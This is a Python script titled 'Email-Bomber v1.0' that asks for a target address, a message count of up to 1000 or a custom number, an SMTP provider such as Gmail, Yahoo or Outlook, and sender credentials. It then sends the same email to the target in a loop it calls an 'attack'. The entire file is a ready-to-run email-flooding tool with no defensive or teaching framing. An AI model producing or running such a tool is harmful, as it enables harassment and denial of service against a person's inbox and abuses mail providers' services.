#!/usr/bin/env python3

import smtplib  # Importing smtplib module to send emails
import sys  # Importing sys module to use system-related functionality


class bcolors:  # Defining a class to manage output text colors
    GREEN = "\033[92m"  # Green color code
    YELLOW = "\033[93m"  # Yellow color code
    RED = "\033[91m"  # Red color code


def banner():  # Function to print a banner indicating the program name and version
    print(bcolors.GREEN + "+[+[+[ Email-Bomber v1.0 ]+]+]+")
    print(bcolors.GREEN + "+[+[+[ Made with codez ]+]+]+")
    # Placeholder for a logo
    print(
        bcolors.GREEN
        + """
             . . .                   #########################################################
              \|/                    # _____           ____                  _               #
            `--+--'                  #| ____|_ __ ___ | __ )  ___  _ __ ___ | |__   ___ _ __ #
              /|\                    #|  _| | '_ ` _ \|  _ \ / _ \| '_ ` _ \| '_ \ / _ \ '__|#
             ' | '                   #| |___| | | | | | |_) | (_) | | | | | | |_) |  __/ |   #
               |                     #|_____|_| |_| |_|____/ \___/|_| |_| |_|_.__/ \___|_|   #
               |                     #########################################################
           ,--'#`--.                                                        Version: 1.0
           |#######|                                                        Author: Omegazyph
        _.-'#######`-._                    
     ,-'###############`-.                 
   ,'#####################`,               
  /#########################\              
 |###########################|             
|#############################|            
|#############################|            
|#############################|            
|#############################|            
 |###########################|             
  \#########################/            
   `.#####################,'               
     `._###############_,'                 
        `--..#####..--'                   
_______________________________________________________________________________________________________________
"""
    )


class Email_Bomber:  # Class to manage email bombing functionality
    count = 0  # Counter to keep track of the number of emails sent

    def __init__(self):  # Constructor method to initialize the class
        try:
            print(bcolors.RED + "\n+[+[+[ Initializing program ]+]+]+")
            # Prompting user to enter target email address
            self.target = str(input(bcolors.GREEN + "Enter target email <: "))
            # Prompting user to select bombing mode
            self.mode = int(
                input(
                    bcolors.GREEN
                    + "Enter BOMB mode (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom) <: "
                )
            )
            # Validating user input for bombing mode
            if int(self.mode) > int(4) or int(self.mode) < int(1):
                print("ERROR: Invalid Option. GoodBye.")
                sys.exit(1)
        except Exception as e:
            print(f"ERROR: {e}")

    def bomb(self):  # Method to initialize bombing parameters
        try:
            print(bcolors.RED + "\n+[+[+[ Setting up bomb ]+]+]+")
            self.amount = None
            # Setting up bomb amount based on selected mode
            if self.mode == int(1):
                self.amount = int(1000)
            elif self.mode == int(2):
                self.amount = int(500)
            elif self.mode == int(3):
                self.amount = int(250)
            else:
                # Allowing custom bomb amount for mode 4
                self.amount = int(input(bcolors.GREEN + "Choose a CUSTOM amount <: "))
                print(
                    bcolors.RED
                    + f"\n+[+[+[ You have selected BOMB mode: {self.mode} and {self.amount} emails ]+]+]+"
                )
        except Exception as e:
            print(f"ERROR: {e}")

    def email(self):  # Method to set up email configuration
        try:
            print(bcolors.RED + "\n+[+[+[ Setting up email ]+]+]+")
            # Prompting user to select email server or enter custom settings
            self.sever = str(
                input(
                    bcolors.GREEN
                    + "Enter email server | or select premade options - 1:(Gmail) 2:(Yahoo) 3:(Outlook) <: "
                )
            )
            premade = ["1", "2", "3"]
            default_port = True

            if self.sever not in premade:
                default_port = False
                # Prompting user to enter custom port number
                self.port = int(input(bcolors.GREEN + "Enter port number <: "))

            # Default port number for known email services
            if default_port:
                self.port = int(587)

            # Mapping selected server to SMTP server address
            if self.sever == "1":
                self.sever = "smtp.gmail.com"
            elif self.sever == "2":
                self.sever = "smtp.mail.yahoo.com"
            elif self.sever == "3":
                self.sever = "smtp-mail.outlook.com"

            # Prompting user to enter sender's email address, password, subject, and message
            self.fromAddr = str(input(bcolors.GREEN + "Enter from address <: "))
            self.fromPwd = str(input(bcolors.GREEN + "Enter from Password <: "))
            self.subject = str(input(bcolors.GREEN + "Enter Subject <: "))
            self.message = str(input(bcolors.GREEN + "Enter message <: "))

            # Constructing email message
            self.msg = """From: %s\nTo: %s\nSubject: %s\n%s\n""" % (
                self.fromAddr,
                self.target,
                self.subject,
                self.message,
            )

            # Connecting to SMTP server and logging in with sender's credentials
            self.s = smtplib.SMTP(self.sever, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)

        except Exception as e:
            print(f"ERROR: {e}")

    def send(self):  # Method to send email
        try:
            # Sending email message to the target address
            self.s.sendmail(self.fromAddr, self.target, self.msg)
            self.count += 1  # Incrementing email counter
            print(bcolors.YELLOW + f"BOMB: {self.count}")  # Displaying bomb count
        except Exception as e:
            print(f"ERROR: {e}")

    def attack(self):  # Method to initiate the email bombing attack
        print(bcolors.RED + "\n+[+[+[ Attacking....... ]+]+]+")
        # Looping to send the specified number of emails
        for email in range(1, self.amount + 1):
            self.send()
        self.s.close()  # Closing SMTP connection
        print(bcolors.RED + "\n+[+[+[ Attack Finished ]+]+]+")
        sys.exit(0)  # Exiting program


if __name__ == "__main__":
    banner()  # Displaying banner
    bomb = Email_Bomber()  # Creating Email_Bomber object
    bomb.bomb()  # Setting up bombing parameters
    bomb.email()  # Setting up email configuration
    bomb.attack()  # Initiating email bombing attack
